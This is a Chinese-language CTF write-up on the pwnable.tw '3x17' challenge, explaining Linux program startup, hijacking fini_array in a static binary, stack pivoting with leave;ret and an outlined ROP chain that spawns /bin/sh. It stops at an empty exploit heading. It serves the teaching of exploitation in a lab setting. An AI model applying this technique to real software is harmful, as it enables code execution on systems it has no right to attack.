
## 往期

[pwnable.tw新手向write up(一)](https://bbs.pediy.com/thread-259290.htm)

## 前置知识

- `main` 函数并不是程序的起点，也不是程序的终点

![image of the callgraph for all the routines involved in program startup on linux](https://bbs.kanxue.com/upload/attach/202005/862439_SHB78UD8UN2TDHG.jpg)

图片出处：`45fK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3c8T1M7q4)9J5k6r3y4G2L8Y4y4#2L8s2c8A6L8X3N6Q4x3X3g2U0L8$3#2Q4x3V1k6@1N6i4c8G2M7X3W2S2L8s2y4Q4x3V1k6V1k6h3u0#2k6$3N6A6L8X3N6Q4x3V1k6D9K9h3&6#2P5q4m8J5L8$3N6J5j5h3#2e0N6r3q4J5N6s2g2H3i4K6u0W2K9s2c8E0L8l9.`

更细致的内容可以参考链接的内容，这里只简单概括一下。`_start` 函数才是程序的入口点，他会调用 `__libc_start_main` 函数，这里可以先看一下 `__libc_start_main` 函数的原型：

```
//libc_start_main函数原型
__libc_start_main(main,argc,argv&env,init,fini,rtld_fini)
```

根据64位程序通过寄存器来保存前六个参数的特性，我们可以得出以下结论：

```
rdi <- main
rcx <- __libc_csu_init    //在main函数前执行
r8 <- __libc_csu_fini    //在main函数后执行
```

也就是说，我们可以在 `_start` 函数中得到上述三个函数的地址。

### 静态链接下的 fini_array 劫持

刚刚我们知道了 `__libc_csu_fini` 函数在 `main` 函数返回之后执行，现在看看具体代码：

```
.text:0000000000402960 __libc_csu_fini proc near               ; DATA XREF: start+Fo
.text:0000000000402960 ; __unwind {
.text:0000000000402960                 push    rbp
.text:0000000000402961                 lea     rax, unk_4B4100
.text:0000000000402968                 lea     rbp, _fini_array_0
.text:000000000040296F                 push    rbx
.text:0000000000402970                 sub     rax, rbp
.text:0000000000402973                 sub     rsp, 8
.text:0000000000402977                 sar     rax, 3
.text:000000000040297B                 jz      short loc_402996
.text:000000000040297D                 lea     rbx, [rax-1]
.text:0000000000402981                 nop     dword ptr [rax+00000000h]
.text:0000000000402988
.text:0000000000402988 loc_402988:                             ; CODE XREF: __libc_csu_fini+34j
.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]
.text:000000000040298C                 sub     rbx, 1
.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh
.text:0000000000402994                 jnz     short loc_402988
.text:0000000000402996
.text:0000000000402996 loc_402996:                             ; CODE XREF: __libc_csu_fini+1Bj
.text:0000000000402996                 add     rsp, 8
.text:000000000040299A                 pop     rbx
.text:000000000040299B                 pop     rbp
.text:000000000040299C                 jmp     sub_48E32C
.text:000000000040299C ; } // starts at 402960
.text:000000000040299C __libc_csu_fini endp
```

在 `.text:0000000000402988` 这个地方有一个 `call` 指令，结合前面的代码可以知道 `rbp` 保存的是 `fini_array` 的值，所以这里会调用 `fini_array` 中的函数。所以只要修改了 `fini_array` 的数值，我们就可以劫持 `eip`。看一下 `fini_array` 的代码：

```
.fini_array:00000000004B40F0 _fini_array     segment para public 'DATA' use64
.fini_array:00000000004B40F0                 assume cs:_fini_array
.fini_array:00000000004B40F0                 ;org 4B40F0h
.fini_array:00000000004B40F0 _fini_array_0   dq offset sub_401B00    ; DATA XREF: .text:000000000040291Co
.fini_array:00000000004B40F0                                         ; __libc_csu_fini+8o
.fini_array:00000000004B40F8                 dq offset sub_401580
.fini_array:00000000004B40F8 _fini_array     ends
```

这里保存了两个函数指针，分别是 `fini_array[0]` 和 `fini_array[1]`，观察 `__libc_csu_fini` 中的汇编代码我们可以得知这俩函数指针是反向执行的，先执行 `fini_array[1]`，再执行 `fini_array[0]`。如果我们将 `fini_array[0]` 覆盖为 `__libc_csu_fini` 的地址，再将 `fini_array[1]` 覆盖为任意一个地址 `A`，那么程序就会循环执行 `A` 地址的代码，直到 `fini_array[0]` 覆盖为其他值。

其次，在 `.text:0000000000402968` 可以修改 `rbp` 为 `fini_array` 的首地址，配合 `leave;ret` 可以把栈迁移到 `fini_array`。

## 具体题目 3×17

- 先查看一下防护。静态链接，又没有符号表，所以基本什么符号都没有了。只开了 NX。

```
(ssh) dylan@eureka-pwn : ~/desktop/pwnable.tw/3×17
[0] % checksec 3x17
[*] '/home/dylan/desktop/pwnable.tw/3×17/3x17'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE

(ssh) dylan@eureka-pwn : ~/desktop/pwnable.tw/3×17
[0] % file 3x17
3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped
```

- 先运行一下，分别输入 `addr` 和 `data` 然后退出，估摸着就是任意地址读写。然后用 IDA。

```
.text:0000000000401A50 start           proc near               ; DATA XREF: LOAD:0000000000400018o
.text:0000000000401A50 ; __unwind {
.text:0000000000401A50                 xor     ebp, ebp
.text:0000000000401A52                 mov     r9, rdx
.text:0000000000401A55                 pop     rsi
.text:0000000000401A56                 mov     rdx, rsp
.text:0000000000401A59                 and     rsp, 0FFFFFFFFFFFFFFF0h
.text:0000000000401A5D                 push    rax
.text:0000000000401A5E                 push    rsp
.text:0000000000401A5F                 mov     r8, offset __libc_csu_fini
.text:0000000000401A66                 mov     rcx, offset __libc_csu_init
.text:0000000000401A6D                 mov     rdi, offset main
.text:0000000000401A74                 db      67h
.text:0000000000401A74                 call    sub_401EB0
.text:0000000000401A7A                 hlt
.text:0000000000401A7A ; } // starts at 401A50
.text:0000000000401A7A start           endp
```

因为没有符号，所以最开始连 `main` 函数都找不到，我们先进到 `start` 函数，根据最开始讲的内容，我们可以很轻松地得到以下内容：

```
__libc_csu_fini -> .text:0000000000402960
__libc_csu_init -> .text:00000000004028D0
main -> .text:0000000000401B6D
```

`__libc_csu_fini` 地址后边会用到，我们先跳转到 `main` 函数：

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  double v3; // xmm0_8
  double v4; // xmm1_8
  double v5; // xmm2_8
  double v6; // xmm3_8
  double v7; // xmm4_8
  double v8; // xmm5_8
  double v9; // xmm6_8
  double v10; // xmm7_8
  int result; // eax
  int v12; // eax
  char *v13; // ST08_8
  char buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    write_func(1u, "addr:", 5uLL);
    read_func(0, &buf, 0x18uLL);
    strtol((__int64)&buf);
    v13 = (char *)v12;
    write_func(1u, "data:", 5uLL);
    read_func(0, v13, 0x18uLL);
    result = 0;
  }
  if ( __readfsqword(0x28u) != canary )
    sub_44A3E0(v3, v4, v5, v6, v7, v8, v9, v10);

  return result;
}
```

改了几个函数的名字，加强了一点可读性，逻辑很简单，输入地址和内容，就可以对目标地址进行更改，是软件给予我们的任意地址写，但是长度只有 `0x18` 个字节，并不足以进行利用，这个时候就用到了前置知识的第二点，我们可以劫持 `fini_array` 来进行多次的任意地址写，从而 getshell。

### 利用方法

- 劫持 `fini_array[1]` 为 `main` 函数地址，`fini_array[0]` 为 `__libc_csu_fini`，将长度为 18 的任意地址写升级为长度无限制的任意地址写。
- 在 `0x4b40f0+0x10` 地址处构造 ROP chain。
- 构造完 ROP chain 之后，将 `fini_array[0]` 改为 `leave;ret`，将 `fini_array[1]` 改为 `ret`。这样，在执行完 `main` 函数（即 `fini_array[1]`）之后，程序去执行位于 `fini_array[0]` 的 `leave;ret`，执行完之后，`rip=fini_array[1]`，`rsp=0x4b40f0+0x10`。此时，`fini_array[1]` 存放着我们放入的 `ret`，这样，`eip` 的值就被修改为了 `0x4b40f0+0x10`。这也就是上一步我们将 ROP chain 放在这个地址的原因。
- 至此，程序就会一步一步执行我们的 ROP 链，ROP 链就很简单了，大致如下：

```
pop_rax
0x3b
pop rdi
addr of "/bin/sh\x00" ;随便放
pop rsi
0
pop rdx
0
syscall
```

### exp
